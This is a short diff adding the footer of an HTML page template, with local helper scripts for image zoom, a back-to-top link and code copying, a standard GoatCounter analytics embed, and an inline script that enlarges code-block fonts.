+  <script src="/js/zoom-img.js" defer></script>
+
+  
+  
+  <script src="/js/link-to-top.js" defer></script>
+
+  
+    
+    
+    <script src="/js/code-copy.js" defer></script>
+  
+
+  <script
+    data-goatcounter="https://seven-demo.goatcounter.com/count"
+    async
+    src="//gc.zgo.at/count.js"></script>
+
+<script>
+      document.querySelectorAll('pre > code').forEach((codeblock) => {
+        codeblock.style = "font-size: large !important;";
+      });
+    </script>
+  </body>
+</html>
